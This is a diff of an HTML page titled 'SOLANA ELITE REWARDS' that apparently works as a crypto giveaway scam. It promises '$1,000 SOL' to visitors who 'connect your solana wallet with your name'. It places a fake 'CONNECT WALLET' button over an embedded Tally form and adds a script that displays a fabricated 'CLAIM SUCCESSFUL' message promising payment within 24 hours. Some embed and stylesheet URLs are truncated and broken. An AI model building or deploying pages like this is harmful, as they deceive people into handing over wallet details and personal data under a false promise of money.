@@ -4,43 +4,70 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SOLANA ELITE REWARDS</title>
-    <!-- Tally Widget Script -->
-    <script src="https://tally.so/widgets/embed.js"></script>
+    <link href="https://googleapis.com" rel="stylesheet">
     <style>
         :root { --sol-g: #00FFA3; --sol-p: #DC1FFF; }
-        body { margin: 0; background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-y: auto; }
-        .card { width: 90%; max-width: 500px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.2); border-radius: 40px; padding: 40px 20px; text-align: center; box-shadow: 0 0 80px rgba(0, 0, 0, 1); margin: 20px; }
-        h1 { font-size: 1.6rem; margin-bottom: 15px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; font-weight: 700; text-transform: uppercase; }
-        .sub { font-size: 0.9rem; color: #777; margin-bottom: 25px; line-height: 1.6; }
-        /* Tally Embed Styling */
-        .tally-container { min-height: 350px; width: 100%; }
+        body { margin: 0; background: #000; color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
+        
+        .card { width: 85%; max-width: 420px; background: #080808; border: 1px solid rgba(0, 255, 163, 0.15); border-radius: 40px; padding: 50px 30px; text-align: center; box-shadow: 0 0 100px #000; position: relative; min-height: 400px; transition: 0.5s; }
+        
+        h1 { font-family: 'Syncopate', sans-serif; font-size: 1.3rem; margin-bottom: 15px; background: linear-gradient(90deg, var(--sol-g), #fff, var(--sol-p)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1px; }
+        
+        .sub { font-size: 0.85rem; color: #777; margin-bottom: 25px; line-height: 1.6; }
+
+        /* FORM VIEW */
+        #form-view { display: block; }
+        .form-wrapper { position: relative; width: 100%; height: 260px; overflow: hidden; border-radius: 20px; }
+        iframe { width: 100%; height: 450px; border: none; position: absolute; top: -25px; left: 0; }
+
+        /* SUCCESS VIEW - Hidden by default */
+        #success-view { display: none; opacity: 0; transform: translateY(20px); transition: 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
+        .success-h { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--sol-g); margin-bottom: 25px; text-shadow: 0 0 20px rgba(0, 255, 163, 0.4); }
+        .congrats { font-size: 1.05rem; line-height: 1.8; color: #fff; padding: 35px; background: rgba(0, 255, 163, 0.05); border-radius: 30px; border: 1px dashed var(--sol-g); box-shadow: inset 0 0 20px rgba(0, 255, 163, 0.05); }
+
+        /* CUSTOM BUTTON OVERLAY */
+        .custom-btn { position: absolute; bottom: 35px; left: 0; width: 100%; padding: 22px; background: linear-gradient(135deg, var(--sol-g), var(--sol-p)); color: #fff; font-family: 'Syncopate', sans-serif; font-weight: 700; font-size: 0.75rem; border-radius: 18px; pointer-events: none; z-index: 10; box-shadow: 0 10px 30px rgba(0, 255, 163, 0.2); }
     </style>
 </head>
 <body>
+
     <div class="card">
-        <h1>CLAIM $1,000 SOL</h1>
-        <p class="sub">To claim your rewards, please complete the task below.</p>
-        
-        <div class="tally-container">
-            <!-- Tally Iframe Embed -->
-            <iframe 
-                data-tally-src="https://tally.so/embed/J90eDY?alignLeft=1&hideTitle=1&transparentBackground=1&dynamicHeight=1" 
-                loading="lazy" 
-                width="100%" 
-                height="350" 
-                frameborder="0" 
-                marginheight="0" 
-                marginwidth="0" 
-                title="Task">
-            </iframe>
+        <!-- CLAIM SECTION -->
+        <div id="form-view">
+            <h1>CLAIM $1,000 SOL</h1>
+            <p class="sub">To claim the $1,000 SOL, connect your solana wallet with your name</p>
+            <div class="form-wrapper">
+                <div class="custom-btn">CONNECT WALLET</div>
+                <iframe data-tally-src="https://tally.so" loading="lazy"></iframe>
+            </div>
+        </div>
+
+        <!-- SUCCESS SECTION -->
+        <div id="success-view">
+            <h1 class="success-h">CLAIM SUCCESSFUL</h1>
+            <div class="congrats">
+                Congrats, you have claimed $1,000 SOL and you’ll receive the $1,000 SOL to your wallet address within 24 hrs
+            </div>
         </div>
     </div>
 
+    <script async src="https://tally.so"></script>
     <script>
-        // Reloads Tally embeds on page load
-        window.onload = function() {
-            if (typeof Tally !== 'undefined') {
-                Tally.loadEmbeds();
+        // THIS DETECTS THE TALLY SUBMISSION
+        window.onmessage = (e) => {
+            if (e.data && e.data.includes('Tally.FormSubmitted')) {
+                const formView = document.getElementById('form-view');
+                const successView = document.getElementById('success-view');
+                
+                // Switch Views
+                formView.style.display = 'none';
+                successView.style.display = 'block';
+                
+                // Trigger Animation
+                setTimeout(() => {
+                    successView.style.opacity = '1';
+                    successView.style.transform = 'translateY(0)';
+                }, 100);
             }
         };
     </script>
